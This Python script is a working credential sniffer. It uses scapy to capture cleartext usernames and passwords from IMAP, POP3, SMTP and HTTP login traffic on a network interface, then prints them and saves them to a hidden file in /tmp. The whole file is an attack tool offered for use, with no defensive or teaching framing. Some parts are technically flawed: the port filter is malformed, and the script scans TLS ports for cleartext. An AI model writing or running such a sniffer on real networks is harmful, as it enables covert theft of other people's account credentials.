#!/usr/bin/env python3
"""
Email Protocol Credential Sniffer
Captures cleartext credentials from IMAP, POP3, SMTP
"""

from scapy.all import sniff, TCP, IP, conf
import re

def extract_email_creds(payload):
    """Extract email credentials from protocol payloads"""
    results = []
    
    # IMAP LOGIN
    imap_login = re.findall(r'LOGIN\s+["\']?([^"\'\s]+)["\']?\s+["\']?([^"\'\s]+)["\']?', payload)
    for user, pwd in imap_login:
        results.append(("IMAP", user, pwd))
    
    # SMTP AUTH LOGIN (base64 encoded user:password)
    smtp_auth = re.findall(r'AUTH\s+LOGIN\s+([A-Za-z0-9+/=]+)\s+([A-Za-z0-9+/=]+)', payload)
    for user_b64, pwd_b64 in smtp_auth:
        try:
            user = __import__('base64').b64decode(user_b64).decode()
            pwd = __import__('base64').b64decode(pwd_b64).decode()
            results.append(("SMTP-LOGIN", user, pwd))
        except:
            pass
    
    # POP3 USER/PASS
    pop3_user = re.findall(r'^USER\s+(.+)$', payload, re.MULTILINE)
    pop3_pass = re.findall(r'^PASS\s+(.+)$', payload, re.MULTILINE)
    if pop3_user and pop3_pass:
        results.append(("POP3", pop3_user[0].strip(), pop3_pass[0].strip()))
    
    # HTTP POST to login endpoints
    if 'POST' in payload and 'login' in payload.lower():
        email_match = re.search(r'email=([^&\s]+)', payload)
        pass_match = re.search(r'password=([^&\s]+)', payload)
        if email_match and pass_match:
            results.append(("HTTP", email_match.group(1), pass_match.group(1)))
    
    return results

def handle_packet(pkt):
    if TCP in pkt and pkt[TCP].payload:
        try:
            payload = bytes(pkt[TCP].payload).decode('utf-8', errors='ignore')
            creds = extract_email_creds(payload)
            
            for proto, user, pwd in creds:
                print(f"[{proto}] {pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport}")
                print(f"    User: {user}")
                print(f"    Pass: {pwd}")
                
                with open("/tmp/.email_sniffed.txt", "a") as f:
                    f.write(f"[{proto}] {user}:{pwd} @ {pkt[IP].dst}\n")
        except:
            pass

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", default="eth0")
    args = parser.parse_args()
    
    print(f"[*] Sniffing for email credentials on {args.interface}...")
    print("[*] Watching: IMAP(143), IMAPS(993), POP3(110), POP3S(995), SMTP(25,587)")
    
    sniff(
        iface=args.interface,
        prn=handle_packet,
        store=0,
        filter="tcp port 25 or tcp port 143 or tcp port 110 or tcp port 587 or tcp port 993 or tcp port 995 or (tcp port 80 and tcp port 443)"
    )